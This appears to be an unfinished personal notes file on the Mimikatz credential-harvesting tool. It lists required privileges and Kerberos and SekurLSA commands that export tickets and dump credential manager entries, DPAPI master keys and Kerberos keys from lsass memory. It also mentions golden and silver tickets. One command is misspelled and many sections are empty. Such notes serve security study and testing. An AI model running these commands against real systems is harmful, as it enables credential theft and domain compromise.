- Used to harvest credentials from a windows machine.
- Has two additional components:
	- `Mimidrv`: driver that interacts with windows kernel
	- `Mimilib`: Bypass applocker, auth package/SSP etc.
- Runs with:
	- `Administrator` with `Privilege::debug` mode
	- `SYSTEM` privilege

# Kerberos
### ask
```bash
kerberos::ask
```
### list
- Lists or exports TGTs and STs from the current session
```powershell
kerberos::list # Lists the tickets
kerberos::list /export # Export the tickets to files
```
### purge
- purge all TGTs and STs from the current session.
```powershell
kerberos::purge
```
### tgt
- Prints information about the TGT from current session
```powershell
kerberos::tgt
```
### golden
[[Active Directory/Exploitation/Kerberos#Golden Tickets|Golden Tickets]]
- Create golden tickets from krbtgt's NTLM hash or Kerberos keys.
### silver
- Create silver ticket from a service's NTLM hash or Kerberos keys.\

# SekurLSA
Dumps keys, password hashses, pin codes from protected memory of lsass.exe proccess.
Rights required:
- SYSTEM
- Administrator with debug privilege (privilege::debug)
### backupkeys
- get backup master keys.
```powershell
sekurlsa::backupkey
```
### credman
- Lists credential manager
```powershell
sekurlsa::credman
```
### dpapi
[[DPAPI]]
- Lists cached master keys
```powershell
sekurlsa::dpapi
```
### dpapisystem
### ekeys
Lists kerberos encryption keys
```powershell
sekursla::ekeys
```
### kerberos

### krbtgt
### livessp
### logon passwords
### minidump
### msv
### process
### pth
### ssp
### tickets
### trust
### tspkg
### widget

# LSAdump